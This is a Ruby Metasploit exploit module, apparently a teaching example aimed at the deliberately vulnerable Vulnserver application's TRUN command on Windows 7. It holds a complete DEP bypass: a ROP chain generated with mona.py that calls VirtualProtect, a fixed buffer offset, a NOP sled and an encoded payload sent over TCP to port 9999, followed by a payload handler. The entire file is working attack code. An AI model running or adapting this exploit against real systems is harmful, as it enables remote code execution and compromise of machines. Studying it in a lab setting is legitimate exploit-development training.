class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'			 => 'DEP Bypass Exploit',
      'Description'	 => %q{
         DEP Bypass Using ROP Chains Example Module
      },
      'Platform'		 => 'win',
      'Author'		 =>
        [
          'Nipun Jaswal'
        ],
      'Payload' =>
      {
      'space' => 312,
      'BadChars' => "\x00",
      },
      'Targets' =>
       [
                  ['Windows 7 Professional',{ 'Offset' => 2006}]
       ],
      'DisclosureDate' => 'Mar 4 2018'
	))
	register_options(
	[
		Opt::RPORT(9999)
	])
  end

 def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x77dfb7e4,  # POP ECX # RETN [RPCRT4.dll] 
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
      0x76a5fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] 
      0x766a70d7,  # POP EBP # RETN [USP10.dll] 
      0x625011bb,  # & jmp esp [essfunc.dll]
      0x777f557c,  # POP EAX # RETN [msvcrt.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x765e4802,  # NEG EAX # RETN [user32.dll] 
      0x76a5f9f1,  # XCHG EAX,EBX # RETN [MSCTF.dll] 
      0x7779f5d4,  # POP EAX # RETN [msvcrt.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x765e4802,  # NEG EAX # RETN [user32.dll] 
      0x76386fc0,  # XCHG EAX,EDX # RETN [kernel32.dll] 
      0x77dfd09c,  # POP ECX # RETN [RPCRT4.dll] 
      0x62504dfc,  # &Writable location [essfunc.dll]
      0x77e461e1,  # POP EDI # RETN [RPCRT4.dll] 
      0x765e4804,  # RETN (ROP NOP) [user32.dll]
      0x777f3836,  # POP EAX # RETN [msvcrt.dll] 
      0x90909090,  # nop
      0x77d43c64,  # PUSHAD # RETN [ntdll.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end
  def exploit
    connect
    rop_chain = create_rop_chain()
    junk = rand_text_alpha_upper(target['Offset'])
    buf = "TRUN ."+junk + rop_chain  + make_nops(16) + payload.encoded+'\r\n'
    sock.put(buf)
    handler
    disconnect
  end
end

